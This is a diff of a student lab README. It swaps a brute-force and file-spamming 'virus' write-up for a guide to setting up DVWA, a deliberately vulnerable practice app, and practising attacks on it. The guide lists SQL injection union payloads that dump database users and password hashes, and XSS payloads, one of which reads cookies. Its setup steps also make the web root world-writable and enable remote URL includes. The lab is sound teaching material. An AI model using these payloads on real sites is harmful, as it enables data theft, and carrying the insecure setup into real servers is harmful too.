@@ -1,35 +1,83 @@
-# Study of Brute Force Attack & A Program to Create a Virus
+# Implementing SQL Injection & Cross Site Scripting using DVWA
 
-### Brute Force Attack
-A brute force method is a method where a set of predefined values are used to crack a password 
+### DVWA
+Damn Vulnerable Web Application (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main goal is to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and to aid both students & teachers to learn about web application security in a controlled class room environment.
 
-until successful. This is basically a “hit and try” method. This method might take a long time if the 
+The aim of DVWA is to practice some of the most common web vulnerabilities, with various levels of difficulty, with a simple straightforward interface. Please note, there are both documented and undocumented vulnerabilities with this software. This is intentional. You are encouraged to try and discover as many issues as possible.
 
-set of values are high, but its success rate is high.
+#### Setting up DVWA
+- **Step 1** : Type the following commands </br>
+  Setting up Apache Web server, Installting DVWA, Installing Mysql, 
+  ``` 
+  $ sudo apt install apache2 
+  $ sudo apt-get install git
+  $ cd /var/www/html/
+  $ sudo git clone https://github.com/ethicalhack3r/DVWA.git
+  $ sudo chmod -R 777 /var/www/html/DVWA/
+  $ sudo apt install mysql-server
+  $ mysql -u root -p
+  $ sudo service apache2 restart
+  $ sudo service mysql restart
+  ```
+  </br>
+- **Setp 2**: Type the following commands</br>
+  Configure DVWA
+  ```
+  $ sudo vim /var/www/html/dvwa/config/config.inc.php.dist
+  ```
+  Add the database name, user and password of the mysql database in the php file
+  ```
+  $ sudo vim /etc/php5/apache2/php.ini
+  ```
+  Add the following lines </br>
+   > **Enable Allow_url_fopen** </br>
+   > **Enable Allow_url_include**
+   </br>
+- **Setp 3**: </br>
+  Starting DVWA </br>
+  Open your Browser and type http://127.0.0.1/DVWA/setup.php </br>
+  Complete the basic setup process and you are ready to use your DVWA
+  
+### SQL Injection
+SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.
+
+In some situations, an attacker can escalate an SQL injection attack to compromise the underlying server or other back-end infrastructure, or perform a denial-of-service attack
+
+- Display the hostname of our web app </br>
+  ```' union select null, @@hostname#```</br>
+  
+- Display Database User </br>
+  ```test' union select null, user() #``` </br>
+  
+- Display the Database Name </br>
+  ```test' union select null, database() #```</br>
+  
+- List all tables in the information schema. </br>
+  ```test' and 1=0 union select null, table_name from information_schema.tables #```</br>
+  
+- Display all the column contents in the information schema users table </br>
+  ```test' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #```</br>
+  
+- List all user tables in the information schema </br>
+  ```test' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'# ```</br>
 
 
+### Cross Site Scripting (XSS)
+Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.
 
-This python-based brute force tool is created in a such a way that it can break any kind of password (only smallcase) with no limitation on the length of the password. Remember the longer the password the more time it will take to break it
+An attacker can use XSS to send a malicious script to an unsuspecting user. The end user’s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page.
 
-#### Sample output
-```
-Enter your password : SMIT 
-Bruteforcing your password: 
-Your password is :  SMIT
-```
+- Reflected XSS payloads </br>
+  **Easy** :  ```<script>alert(“xss”)</script> ``` </br>
+  **Medium** : ```<Script>alert(“SMIT”)</Script>```</br>
+  **Hard** : ```<img src=x onerror=alert(“falcon”)>``` </br>
 
-### Virus
-A computer virus is a type of malicious software, or malware, that spreads between computers and causes damage to data and software. 
+- Stored XSS Payloads</br>
+  **Easy** : ```<script>alert(document.domain)</script>``` </br>
+  **Medium** : ```<img src=x onerror=alert(document.domain)>```<br>
+  **Hard** : ```<body onload=alert(“bingo”)>```
 
-Computer viruses aim to disrupt systems, cause major operational issues, and result in data loss and leakage. A key thing to know about computer viruses is that they are designed to spread across programs and systems. Computer viruses typically attach to an executable host file, which results in their viral codes executing when a file is opened. The code then spreads from the document or software it is attached to via networks, drives, file-sharing programs, or infected email attachments.
-
-
-Create your target folder - this is the folder you want your virus to attack.
-
-For demonstration purposes, I have created a folder called Test under the C Drive.
-
-```
-C:\Test
-```
-This virus would create an endless number of text files which contains a different number in the text document each time.
-
+- DOM XSS Payloads </br>
+  **Easy** : ```/?default=<script>alert(1)</script>``` </br>
+  **Medium** : ```/?default=English#<script>alert(1)</script>``` </br>
+  **Hard** : ```/?default=English#<script>alert(document.cookie)</script>```
